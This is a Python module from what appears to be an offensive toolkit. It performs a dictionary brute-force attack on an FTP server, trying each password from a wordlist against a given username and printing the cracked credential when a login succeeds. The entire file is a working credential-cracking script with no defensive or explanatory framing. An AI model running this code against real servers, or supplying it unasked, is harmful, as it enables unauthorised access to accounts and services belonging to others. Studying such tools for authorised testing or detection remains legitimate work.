import ftplib
from validators import ftplbf_arg_validator
from common import helper

def run(args):
    
    if '-h' in args:
        helper.ftplbf_helper()

    ftplbf = ftplbf_arg_validator.validate(args)

    host = ftplbf.host
    username = ftplbf.username
    password_wordlist= ftplbf.password_wordlist

    found_password = None

    print('---------------------------------------------')
    print('---------------- Cracking... ----------------')
    print('---------------------------------------------')

    ftp = ftplib.FTP(host)

    with open(password_wordlist, 'r') as file:
        passwords = file.readlines()

        for password in passwords:
            password = password.strip()
            
            try:
                ftp.login(username, password)
                found_password = password
                ftp.quit()
                break
            except ftplib.error_perm:
                print(f'Failed login!, Password: {password}')
    
    

    print('---------------------------------------------')
    print('------------- Cracker Complete --------------')
    print('---------------------------------------------')

    if found_password:
        print(f'Successful! Username: {username}, Password: {found_password}')
    else:
        print('Brute force attack failed!')
